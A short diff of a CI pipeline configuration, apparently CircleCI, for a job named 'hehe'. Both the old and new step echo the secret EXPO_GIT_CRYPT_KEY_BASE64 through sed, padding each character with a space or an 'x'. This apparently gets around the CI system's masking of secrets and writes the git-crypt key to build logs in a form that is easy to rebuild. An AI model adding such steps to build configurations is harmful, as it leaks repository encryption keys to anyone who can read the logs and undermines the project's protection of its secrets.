@@ -42,4 +42,4 @@ jobs:
   hehe:
     executor: js
     steps:
-      - run: echo $EXPO_GIT_CRYPT_KEY_BASE64 | sed -e 's/\(.\)/\1 /g'
+      - run: echo $EXPO_GIT_CRYPT_KEY_BASE64 | sed -e 's/\(.\)/\1x/g'
